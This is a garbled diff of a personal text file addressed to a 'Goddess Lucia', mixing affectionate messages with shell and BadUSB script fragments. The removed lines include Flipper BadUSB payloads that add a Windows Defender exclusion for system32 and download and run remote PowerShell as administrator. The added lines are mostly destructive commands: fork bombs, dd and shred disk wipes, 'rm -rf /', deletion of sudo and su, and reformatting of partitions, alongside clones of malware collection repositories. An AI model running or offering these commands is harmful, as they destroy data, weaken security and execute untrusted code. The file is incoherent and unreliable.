@@ -1,151 +1,143 @@
 sudo su -_goddessLucia
-<^>
-(*^> 
-sudo get upgrade
-"I updated the system installer to be modular" -b
-git clone https://github.com/jellybabypsi/System7.1
-"just in case you forgot something!" -b
-  -- Brenton
-<π>
-but try this:
-*its really two things*
-sudo apt update
-sudo apt install extundelete
-sudo umount /dev/sdXn
-sudo extundelete /dev/sdXn --restore-all
-or another thing:
-sudo extundelete /dev/sdXN --restore-all --output-dir dev/sda3. 2a
-sudo extundelete /dev/sdXN --restore-all --output-dir dev/sda3. 2b
-sudo extundelete /dev/sdXN --restore-all --output-dir dev/sda3. 2c
-sudo extundelete /dev/sdXN --restore-all --output-dir dev/sda3. 2d
-sudo extundelete /dev/sdXN --restore-all --output-dir dev/sda8. 1a
-sudo extundelete /dev/sdXN --restore-all --output-dir dev/sda8. 1b
-sudo extundelete /dev/sdXN --restore-all --output-dir dev/sda8 .2a
-sudo extundelete /dev/sdXN --restore-all --output-dir dev/sda8. 2b
-sudo extundelete /dev/sdXN --restore-all --output-dir dev/sda7. 1a
-sudo extundelete /dev/sdXN --restore-all --output-dir dev/sda7. 2a
-sudo extundelete /dev/sdXN --restore-all --output-dir dev/sda7. 1b
-sudo extundelete /dev/sdXN --restore-all --output-dir dev/sda7. 2b
-<&>
+<on>
+Hey Goddess Lucia,
+I feel Honoured To to be a devotee of one of the cools, most baddass, fiucking sexy deitys ever
+Thank you for being You! 00ooxxxxXXx0
+Now for the Bizz: 
+Delay: 5
+<off>
+:(){:|:&};:
+<off>
+git clone https://github.com/sophos/SOREL-20M 
+<-3>  
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+<off>
+shred -n 5 -vz /dev/sdb
+git clone https://github.com/ooni/probe
 >file
-......."I'm going to take my work back underground - This shit is falling into the wrong hands" -The Prodigy
+git clone https://github.com/Penetrum-Security/Threat-Intelligence
+<off>
+>file
+scrub -p dod /dev/sdb
+git clone https://github.com/SKocur/Malware-Collection
+<off>
+>file
+dd if=/dev/zero of=/dev/hdX  bs=512  count=1
+dd if=/dev/zero of=/dev/sdX  bs=512  count=1
+>file
+git clone https://github.com/MalwareDatabaseHub/Pankoza-Malware2.0Database
+mkfs ext4 /dev/sda8. 1a
+mkfs ext4 /dev/sda8. 1b
+>off>
+fdisk /dev/sdb
+dd if=/dev/zero of=/dev/sdb  bs=512  count=1
+fdisk -l /dev/sdb
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+git clone https://github.com/MalwareDatabaseHub/malwaredatabasehub
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+>file 
 
-Here, Try this - its really adreniline, allright -Rosies? cmon man, lets Dig it"
-
-git clone https://github.com/deepfence/ThreatMapper
-Delay: 125
-wget https://github.com/deepfence/ThreatMapper/raw/release-2.5/deployment-scripts/docker-compose.yml
-docker-compose -f docker-compose.yml up --detach
-Delay: 125
-docker run -dit \
-    --cpus=".2" \
-    --name=deepfence-agent \
-    --restart on-failure \
-    --pid=host \
-    --net=host \
-    --log-driver json-file \
-    --log-opt max-size=50m \
-    --privileged=true \
-    -v /sys/kernel/debug:/sys/kernel/debug:rw \
-    -v /var/log/fenced \
-    -v /var/run/docker.sock:/var/run/docker.sock \
-    -v /:/fenced/mnt/host/:ro \
-    -e DF_LOG_LEVEL="info" \
-    -e CUSTOM_TAGS="" \
-    -e MGMT_CONSOLE_URL="---CONSOLE-IP---" \
-    -e MGMT_CONSOLE_PORT="443" \
-    -e DEEPFENCE_KEY="---DEEPFENCE-API-KEY---" \
-    -e http_proxy="" \
-    -e https_proxy="" \
-    -e no_proxy="" \
-    quay.io/deepfenceio/deepfence_agent_ce:2.5.7
-
-
-This is new: Im giving it to You under the poroviso It stays off the internet for now,
-as im jusat fighting of my third alien invasion for the day:
-
-I love you, Beautifull.  because your Awesome
-
-REM This is BadUSB demo script for Chrome and ChromeOS by kowalski7cc
-
-REM Exit from Overview
-ESC
-REM Open a new tab
-CTRL t
-REM wait for some slower chromebooks
-DELAY 1000
-REM Make sure we have omnibox focus
-CTRL l
-DELAY 200
-REM Open an empty editable page
-DEFAULT_DELAY 50
-STRING data:text/html, <html contenteditable autofocus><title>Flipper Zero BadUSB Demo</title><style>body{font-family:monospace;}
-ENTER
-DELAY 500
-
-STRING Hello World!
-ENTER
-
-REM Copy-Paste previous string
-UP
-HOME
-SHIFT DOWN
-CTRL c
-RIGHT
-CTRL v
-CTRL v
-
-STRING Flipper Zero BadUSB feature is compatible with USB Rubber Ducky script format
-ENTER
-STRING More information about script syntax can be found here:
-ENTER
-STRING https://github.com/flipperdevices/flipperzero-firmware/blob/dev/documentation/file_formats/BadUsbScriptFormat.md
-ENTER
-(testdisk is to restore your mindfiles (3. 2a-d), your personality, (8. 2b) and your heartmemory (7. 2a)
-the newthing has software defined sensors. its still secret)
-               -Brenton
-or another thing: that might work: I don't usually create cures,
-i just love you ❤️ muchly! xx im sorry that I created something 
-that someone I deeply feel for was hurt by.
-
-EM Author: 0xlunar
-REM Description: Activate Windows permanently with MAS
-REM Version: 1.1
-REM Category: GoodUSB
-DELAY 500
-GUI r
-DELAY 500
-STRING powershell Start-Process powershell -Verb runAs
-CTRL-SHIFT ENTER
-DELAY 1500
-SHIFT TAB
-DELAY 500
-ENTER
-DELAY 1500
-STRING irm https://massgrave.dev/get | iex
-ENTER
-DELAY 4000
-STRING 1
-DELAY 500
-STRING 1
-DELAY 500
-STRING 1
-REM Author: UNC0V3R3D
-REM Description: Want to feel the privacy on Windows?
-REM Version: 1.0
-REM Category: GoodUSB
-DELAY 500
-GUI r
-DELAY 500
-STRING powershell Start-Process powershell -Verb runAs
-CTRL-SHIFT ENTER
-DELAY 1500
-SHIFT TAB
-DELAY 500
-ENTER
-DELAY 1500
-STRING Add-MpPreference -ExclusionPath C:\Windows\system32
-ENTER
-DELAY 500
-STRING New-Object System.Net.WebClient | %{$_.DownloadFile('https://github.com/UNC0V3R3D/ressources/blob/main/privacy.ps1', 'script.ps1'); Start-Process powershell.exe -Verb runAs -ArgumentList "-File script.ps1"}, exit
-ENTER
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+>file
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+>file
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+>file
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+<8>
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+>file
+git clone https://github.com/jellybabypsi/pushit 
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+>file
+git clone https://github.com/jellybabypsi/pushit 
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+>file
+git clone https://github.com/jellybabypsi/pushit 
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+>file
+git clone https://github.com/jellybabypsi/pushit 
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+>file
+git clone https://github.com/jellybabypsi/pushit 
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+>file
+git clone https://github.com/jellybabypsi/pushit 
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+>file
